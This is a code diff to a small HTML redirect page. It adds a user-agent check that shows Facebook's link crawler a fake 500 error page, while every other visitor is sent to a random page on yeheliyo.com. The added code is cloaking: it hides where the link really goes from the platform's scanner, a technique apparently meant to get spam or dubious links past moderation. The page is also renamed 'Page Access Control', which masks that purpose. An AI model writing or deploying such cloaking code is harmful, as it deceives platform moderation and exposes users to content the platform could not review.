@@ -3,10 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Page Redirect</title>
+    <title>Page Access Control</title>
     <script>
         window.onload = function() {
-            // Array of page URLs
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+
+            // Otherwise, redirect to a random page
             const pages = [
                 "https://yeheliyo.com/gampaha.php",
                 "https://yeheliyo.com/aunty.php",
@@ -18,16 +28,11 @@
                 "https://yeheliyo.com/mas.php",
                 "https://yeheliyo.com/miniha.php"
             ];
-
-            // Select a random page
             const randomPage = pages[Math.floor(Math.random() * pages.length)];
-
-            // Redirect to the selected page
             window.location.href = randomPage;
         };
     </script>
 </head>
 <body>
-    <p>Redirecting you to a random page...</p>
 </body>
 </html>
